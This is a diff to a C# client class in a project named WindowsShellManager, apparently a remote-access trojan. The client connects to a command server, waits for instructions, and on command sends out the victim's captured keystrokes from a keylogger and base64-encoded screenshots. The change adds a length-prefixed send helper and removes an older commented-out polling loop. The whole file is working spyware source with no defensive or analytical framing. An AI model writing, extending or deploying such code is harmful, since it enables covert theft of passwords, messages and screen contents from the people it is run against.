@@ -11,7 +11,7 @@ namespace WindowsShellManager
 {
     internal class Client
     {
-        public static void Connect(String server)
+        public void Connect(String server)
         {
             while (true)
             {
@@ -23,35 +23,38 @@ namespace WindowsShellManager
 
                     Byte[] data = Encoding.ASCII.GetBytes("CONNECT");
                     NetworkStream stream = client.GetStream();
-                    stream.Write(data, 0, data.Length);
+                    SendData(stream, data);
 
 
                     while (true)
                     {
                         try
                         {
+
                             data = new Byte[packetSize];
                             String responseData = String.Empty;
                             Int32 bytes = stream.Read(data, 0, data.Length);
+
+
+
+
                             responseData = Encoding.ASCII.GetString(data, 0, bytes);
                             Console.WriteLine("Received: {0}", responseData);
-
                             if (responseData.ToUpper() == "SENDKCAPTURE")
                             {
                                 Console.WriteLine("Sending Data...");
                                 data = new Byte[packetSize];
                                 data = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
                                 features.KeyLogger.KeyLog = String.Empty;
-                                stream.Write(data, 0, data.Length);                                
+                                SendData(stream, data);
                             }
                             else if (responseData.ToUpper() == "SCREENSHOT")
                             {
                                 Image bmp = new features.ScreenCapture().CaptureScreen();
                                 data = new Byte[packetSize];
                                 string image = Helpers.helper.ImageToBase64(bmp);
-                                Console.WriteLine(image);
-                                data = Encoding.ASCII.GetBytes("IMAGE" + image);                                                               
-                                stream.Write(data, 0, data.Length);
+                                data = Encoding.ASCII.GetBytes("IMAGE" + image);
+                                SendData(stream, data);
                                 bmp.Dispose();
                             }
                             else if (responseData.ToUpper() == "DISCONNECT")
@@ -66,36 +69,6 @@ namespace WindowsShellManager
                             break;
                         }
                     }
-
-
-
-                    //while (true)
-                    //{
-                    //    Console.WriteLine("Polling....");
-                    //    responseData = String.Empty;
-                    //    bytes = stream.Read(data, 0, data.Length);
-                    //    responseData = Encoding.ASCII.GetString(data, 0, bytes);
-
-                    //    Console.WriteLine("Received: {0}", responseData);
-                    //    if (responseData.ToUpper() == "SENDKCAPTURE")
-                    //    {
-                    //        Console.WriteLine("Sending Data...");
-                    //        data = new Byte[packetSize];
-                    //        data = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
-                    //        features.KeyLogger.KeyLog = String.Empty;
-                    //        stream.Write(data, 0, data.Length);
-                    //        File.Delete(Program.filePath);
-                    //    }
-                    //    else if (responseData.ToUpper() == "DISCONNECT")
-                    //    {
-                    //        data = new Byte[packetSize];
-                    //        data = Encoding.ASCII.GetBytes("DISCONNECT");
-                    //        stream.Write(data, 0, data.Length);
-                    //        stream.Close();
-                    //        client.Close();                      
-                    //    }
-                    //    break;
-                    //}
                 }
                 catch (ArgumentNullException e)
                 {
@@ -110,6 +83,13 @@ namespace WindowsShellManager
                     Console.WriteLine("FileNotFoundException: {0}", e);
                 }
             }
+        }
+
+        void SendData(NetworkStream stream, byte[] data)
+        {
+            byte[] dataLength = BitConverter.GetBytes(data.Length);
+            stream.Write(dataLength, 0, dataLength.Length);
+            stream.Write(data, 0, data.Length);
         }
     }
 }
